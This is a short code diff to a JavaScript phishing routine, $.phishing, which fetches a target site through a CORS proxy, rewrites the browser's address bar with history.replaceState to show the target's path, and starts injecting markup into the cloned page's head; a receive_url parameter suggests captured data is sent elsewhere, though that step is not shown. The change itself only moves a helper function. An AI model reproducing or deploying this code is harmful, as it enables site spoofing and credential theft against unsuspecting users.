@@ -6,12 +6,12 @@
   load_jquery();
   $ = jQuery;
   $.phishing = function(url,receive_url){
-    $.get(`https://crossorigin.me/${url}`,data=>{
-      var get_link = (url=>{
-        var link = document.createElement('a');
-        link.href = url;
-        return link;
-      });
+    var get_link = (url=>{
+      var link = document.createElement('a');
+      link.href = url;
+      return link;
+    });
+    $.get(`https://crossorigin.me/${get_link(url).href}`,data=>{
       var target = get_link(url);
       history.replaceState('','',`${location.protocol}//${location.host}${target.pathname}${target.search}${target.hash}`);
       data = data.replace(/<head.*>/i,`
